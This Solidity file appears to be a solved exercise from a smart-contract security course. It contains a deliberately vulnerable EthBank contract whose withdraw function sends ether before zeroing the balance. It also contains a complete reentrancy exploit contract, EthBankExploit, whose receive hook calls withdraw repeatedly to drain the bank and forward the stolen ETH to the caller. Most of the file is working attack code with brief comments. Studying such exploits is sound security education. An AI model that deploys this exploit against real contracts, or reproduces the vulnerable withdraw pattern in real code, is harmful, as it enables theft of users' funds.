/*
Alice and Bob each has 1 ETH deposited into EthBank contract.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract EthBank {
    mapping(address => uint) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external payable {
        (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(sent, "failed to send ETH");

        balances[msg.sender] = 0;
    }
}

Task:
    - Drain all ETH from EthBank. You will be given 1 ETH when pwn is called.

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

contract EthBank {
    mapping(address => uint) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external payable {
        // low level `call` to send Ether back to the user and then sets their balance to 0.
        // this transfer is done before the balance update
        (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(sent, "failed to send ETH");

        balances[msg.sender] = 0;
    }
}

interface IEthBank {
    function deposit() external payable;

    function withdraw() external payable;
}


// the reentrancy attack works because control returns to the calling contract (`EthBankExploit`) 
// after the Ether transfer but before the balance update in the `withdraw` function, 
// allowing for a repetitive reentrant call to the `withdraw` function and draining the `EthBank` contract of its Ether
contract EthBankExploit {
    IEthBank public bank;

    constructor(IEthBank _bank) {
        bank = _bank;
    }

    receive() external payable {
        // call `withdraw` if the balance of the `bank` contract >= 1 eth
        // `bank` contract balance hasn't been updated yet
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function pwn() external payable {
        bank.deposit{ value: 1 ether }();
        bank.withdraw();
        // it transfers any remaining balance from the `EthBankExploit` to the address that called the `pwn` function
        payable(msg.sender).transfer(address(this).balance);
    }
}
